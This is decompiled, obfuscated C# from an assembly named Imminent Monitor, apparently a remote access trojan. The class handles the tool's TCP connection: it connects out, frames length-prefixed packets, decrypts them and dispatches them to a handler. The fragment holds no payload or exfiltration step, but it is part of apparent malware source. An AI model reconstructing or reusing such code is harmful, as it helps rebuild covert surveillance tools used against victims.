// Decompiled with JetBrains decompiler
// Type: GClass10
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent.IServerVars;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;

public sealed class GClass10
{
  private GClass10.GDelegate3 gdelegate3_0;
  private GClass10.GDelegate2 gdelegate2_0;
  private GClass10.GDelegate1 gdelegate1_0;
  private byte[] byte_0;
  private bool bool_0;
  private bool bool_1;
  private int int_0;
  private IServerClient iserverClient_0;
  private IPEndPoint ipendPoint_0;
  private bool bool_2;
  private bool bool_3;
  private bool bool_4;
  public Socket socket_0;
  private byte[] byte_1;
  private bool bool_5;
  private Queue<byte[]> queue_0;
  private int int_1;
  private GClass10.Enum1 enum1_0;
  private int int_2;
  private int int_3;
  private int int_4;
  private int int_5;
  private Class159 class159_0;

  public GClass10()
  {
    this.method_7(Encoding.UTF8.GetBytes("1337"));
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.enum1_0 = (GClass10.Enum1) 0;
    this.int_2 = 4;
    this.class159_0 = new Class159();
    this.bool_4 = true;
  }

  public GClass10(Socket socket_1, bool bool_6, int int_6)
  {
    this.method_7(Encoding.UTF8.GetBytes("1337"));
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.enum1_0 = (GClass10.Enum1) 0;
    this.int_2 = 4;
    this.class159_0 = new Class159();
    try
    {
      this.socket_0 = socket_1;
      this.bool_0 = bool_6;
      this.int_0 = int_6;
      this.method_20();
      this.method_21();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_25();
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(GClass10.GDelegate3 gdelegate3_1) => this.gdelegate3_0 += gdelegate3_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(GClass10.GDelegate3 gdelegate3_1) => this.gdelegate3_0 -= gdelegate3_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_2(GClass10.GDelegate2 gdelegate2_1) => this.gdelegate2_0 += gdelegate2_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_3(GClass10.GDelegate2 gdelegate2_1) => this.gdelegate2_0 -= gdelegate2_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_4(GClass10.GDelegate1 gdelegate1_1) => this.gdelegate1_0 += gdelegate1_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_5(GClass10.GDelegate1 gdelegate1_1) => this.gdelegate1_0 -= gdelegate1_1;

  public byte[] method_6() => this.byte_0;

  public void method_7(byte[] byte_2) => this.byte_0 = byte_2;

  public bool method_8() => this.bool_0;

  public void method_9(bool bool_6)
  {
    if (this.method_18())
      throw new Exception("Unable to change this property while socket is in use.");
    this.bool_0 = bool_6;
  }

  public bool method_10() => this.bool_1;

  public void method_11(bool bool_6) => this.bool_1 = bool_6;

  public int method_12() => this.int_0;

  public void method_13(int int_6)
  {
    if (int_6 < 1)
      throw new Exception("Value must be greater than 0.");
    if (this.method_18())
      throw new Exception("Unable to change this property while socket is in use.");
    this.int_0 = int_6;
  }

  public IServerClient method_14() => this.iserverClient_0;

  public void method_15(IServerClient iserverClient_1) => this.iserverClient_0 = iserverClient_1;

  public IPEndPoint method_16() => this.ipendPoint_0 != null ? this.ipendPoint_0 : new IPEndPoint(IPAddress.None, 0);

  public bool method_17() => this.bool_2;

  public bool method_18() => this.bool_2 || this.bool_3;

  public bool method_19() => this.bool_4;

  private void method_20()
  {
    this.byte_1 = new byte[65536];
    this.queue_0 = new Queue<byte[]>();
  }

  private void method_21()
  {
    try
    {
      this.ipendPoint_0 = (IPEndPoint) this.socket_0.RemoteEndPoint;
      this.bool_3 = false;
      this.bool_2 = true;
      if (this.method_19())
      {
        GClass10.GDelegate3 gdelegate30 = this.gdelegate3_0;
        if (gdelegate30 != null)
          gdelegate30(this, true);
      }
      this.socket_0.BeginReceive(this.byte_1, 0, this.method_12(), SocketFlags.None, new AsyncCallback(this.method_22), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass10.GDelegate1 gdelegate10 = this.gdelegate1_0;
      if (gdelegate10 != null)
        gdelegate10(this, exception_0);
      this.method_25();
      ProjectData.ClearProjectError();
    }
  }

  private void method_22(IAsyncResult iasyncResult_0)
  {
    int int_2;
    try
    {
      int_2 = this.socket_0.EndReceive(iasyncResult_0);
      if (int_2 <= 0)
      {
        this.method_25();
        return;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_25();
      ProjectData.ClearProjectError();
      return;
    }
    if (this.bool_1)
    {
      GClass10.GDelegate2 gdelegate20 = this.gdelegate2_0;
      if (gdelegate20 != null)
        gdelegate20(this, (double) this.int_3 / (double) this.byte_1.Length * 100.0, this.int_3, this.byte_1.Length, int_2);
    }
    try
    {
      this.int_1 += int_2;
      bool flag = true;
      while (flag)
      {
        switch (this.enum1_0)
        {
          case (GClass10.Enum1) 0:
            flag = this.int_1 >= this.int_2;
            if (this.int_1 >= this.int_2)
            {
              this.int_5 = BitConverter.ToInt32(this.byte_1, this.int_3);
              this.int_1 -= this.int_2;
              this.int_3 += this.int_2;
              if (this.int_5 > this.byte_1.Length - 1)
                Array.Resize<byte>(ref this.byte_1, this.int_5);
              this.enum1_0 = (GClass10.Enum1) 1;
              continue;
            }
            continue;
          case (GClass10.Enum1) 1:
            flag = this.int_1 >= this.int_5;
            if (this.int_1 >= this.int_5)
            {
              this.byte_1 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_1(this.byte_1, Class97.gclass45_0.byte_1, this.int_3, this.int_5);
              object[] object_1 = this.class159_0.method_3(this.byte_1, this.int_5, this.int_3);
              dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader genum8_0 = (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) object_1[0];
              Class97.gclass45_0.method_4(this, (GClass45.GEnum8) genum8_0, object_1);
              this.int_3 += this.int_5;
              this.int_1 -= this.int_5;
              this.enum1_0 = (GClass10.Enum1) 0;
              continue;
            }
            continue;
          default:
            continue;
        }
      }
      if (this.int_3 + (this.enum1_0 != (GClass10.Enum1) 0 ? this.int_5 : this.int_2) >= this.byte_1.Length - 1)
      {
        Array.Copy((Array) this.byte_1, this.int_3, (Array) this.byte_1, 0, this.int_1);
        this.int_4 = this.int_1;
        this.int_3 = 0;
      }
      else
        this.int_4 += int_2;
      if (this.byte_1.Length - this.int_4 > 0)
        this.socket_0.BeginReceive(this.byte_1, this.int_4, this.byte_1.Length - this.int_4, SocketFlags.None, new AsyncCallback(this.method_22), (object) null);
      else
        this.method_25();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.method_25();
      ProjectData.ClearProjectError();
    }
  }

  public void method_23(byte[] byte_2)
  {
    if (!this.bool_2)
      return;
    if (byte_2 == null)
      return;
    try
    {
      lock (this.queue_0)
      {
        this.queue_0.Enqueue(byte_2);
        if (this.bool_5)
          return;
        this.bool_5 = true;
        this.method_24();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass10.GDelegate1 gdelegate10 = this.gdelegate1_0;
      if (gdelegate10 != null)
        gdelegate10(this, exception_0);
      this.method_25();
      ProjectData.ClearProjectError();
    }
  }

  private void method_24()
  {
    while (true)
    {
      if (!this.socket_0.Connected)
        goto label_11;
label_1:
      byte[] sourceArray;
      lock (this.queue_0)
      {
        if (this.queue_0.Count == 0)
        {
          this.bool_5 = false;
          break;
        }
        sourceArray = this.queue_0.Dequeue();
      }
      byte[] bytes = BitConverter.GetBytes(sourceArray.Length);
      byte[] numArray = new byte[sourceArray.Length + 3 + 1];
      Array.Copy((Array) bytes, (Array) numArray, bytes.Length);
      Array.Copy((Array) sourceArray, 0, (Array) numArray, 4, sourceArray.Length);
      try
      {
        this.socket_0.Send(numArray);
        continue;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.method_25();
        ProjectData.ClearProjectError();
        continue;
      }
label_11:
      this.method_25();
      goto label_1;
    }
  }

  public void method_25()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      if (!this.method_18())
        goto label_20;
label_2:
      num3 = 5;
      this.bool_2 = false;
label_3:
      num3 = 6;
      this.bool_3 = false;
label_4:
      num3 = 7;
      if (this.socket_0 == null)
        goto label_7;
label_5:
      num3 = 8;
      this.socket_0.Close();
label_6:
      num3 = 9;
      this.socket_0 = (Socket) null;
label_7:
      num3 = 11;
      if (this.queue_0 == null)
        goto label_10;
label_8:
      num3 = 12;
      this.queue_0.Clear();
label_9:
      num3 = 13;
      this.queue_0 = (Queue<byte[]>) null;
label_10:
      num3 = 15;
      this.bool_5 = false;
label_11:
      num3 = 16;
      GClass10.GDelegate3 gdelegate30 = this.gdelegate3_0;
      if (gdelegate30 != null)
        gdelegate30(this, false);
label_13:
      num3 = 17;
      this.ipendPoint_0 = (IPEndPoint) null;
      goto label_20;
label_15:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
            case 18:
              goto label_20;
            case 4:
            case 5:
              goto label_2;
            case 6:
              goto label_3;
            case 7:
              goto label_4;
            case 8:
              goto label_5;
            case 9:
              goto label_6;
            case 10:
            case 11:
              goto label_7;
            case 12:
              goto label_8;
            case 13:
              goto label_9;
            case 14:
            case 15:
              goto label_10;
            case 16:
              goto label_11;
            case 17:
              goto label_13;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_15;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_20:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public void method_26(string string_0, ushort ushort_0)
  {
    try
    {
      this.bool_3 = true;
      this.method_20();
      this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this.socket_0.NoDelay = true;
      this.socket_0.Connect(string_0, (int) ushort_0);
      if (!this.socket_0.Connected)
        return;
      this.socket_0.BeginReceive(this.byte_1, 0, this.method_12(), SocketFlags.None, new AsyncCallback(this.method_22), (object) null);
      this.bool_2 = true;
      GClass10.GDelegate3 gdelegate30 = this.gdelegate3_0;
      if (gdelegate30 == null)
        return;
      gdelegate30(this, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      GClass10.GDelegate1 gdelegate10 = this.gdelegate1_0;
      if (gdelegate10 != null)
        gdelegate10(this, exception_0);
      this.method_25();
      ProjectData.ClearProjectError();
    }
  }

  public delegate void GDelegate1(GClass10 gclass10_0, Exception exception_0);

  public delegate void GDelegate2(
    GClass10 gclass10_0,
    double double_0,
    int int_0,
    int int_1,
    int int_2);

  private enum Enum1
  {
  }

  public delegate void GDelegate3(GClass10 gclass10_0, bool bool_0);
}
